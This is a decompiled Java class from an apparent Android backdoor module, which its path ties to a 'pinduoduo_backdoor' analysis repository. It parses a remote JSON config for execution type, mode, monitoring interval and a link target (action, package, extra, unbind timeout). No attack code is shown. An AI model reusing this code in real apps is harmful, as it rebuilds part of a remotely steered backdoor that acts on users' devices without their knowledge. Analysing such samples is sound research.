package com.google.android.sd.biz_dynamic_dex.td.logcat.c;

import android.text.TextUtils;
import org.json.JSONException;
import org.json.JSONObject;

public final class a {
  public static int a(String paramString) {
    try {
      return TextUtils.isEmpty(paramString) ? 0 : (new JSONObject(paramString)).optInt("execute_type", 0);
    } catch (JSONException jSONException) {
      return 0;
    } 
  }
  
  public static int b(String paramString) {
    try {
      return TextUtils.isEmpty(paramString) ? 101 : (new JSONObject(paramString)).optInt("mode", 101);
    } catch (JSONException jSONException) {
      return 101;
    } 
  }
  
  public static String c(String paramString) {
    try {
      return TextUtils.isEmpty(paramString) ? "uuid" : (new JSONObject(paramString)).optString("uuid", "uuid");
    } catch (JSONException jSONException) {
      return "uuid";
    } 
  }
  
  public static long d(String paramString) {
    try {
      return TextUtils.isEmpty(paramString) ? 86400L : (new JSONObject(paramString)).optLong("proguard_monitor_time_sec", 86400L);
    } catch (JSONException jSONException) {
      return 86400L;
    } 
  }
  
  public static a e(String paramString) {
    try {
      if (TextUtils.isEmpty(paramString))
        return null; 
      JSONObject jSONObject = (new JSONObject(paramString)).optJSONObject("link_config");
      if (jSONObject == null)
        return null; 
      paramString = jSONObject.optString("link_action");
      if (TextUtils.isEmpty(paramString))
        return null; 
      String str1 = jSONObject.optString("link_pkg");
      if (TextUtils.isEmpty(str1))
        return null; 
      String str2 = jSONObject.optString("link_extra");
      if (TextUtils.isEmpty(str2))
        return null; 
      long l = jSONObject.optLong("unbind_in_millis", 20000L);
      a a1 = new a();
      a1.a = paramString;
      a1.b = str1;
      a1.c = str2;
      a1.d = l;
      return a1;
    } catch (JSONException jSONException) {
      return null;
    } 
  }
  
  public static final class a {
    public String a;
    
    public String b;
    
    public String c;
    
    public long d;
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\2aa151e2cfa04acb8fb96e523807ca6b-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\c\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */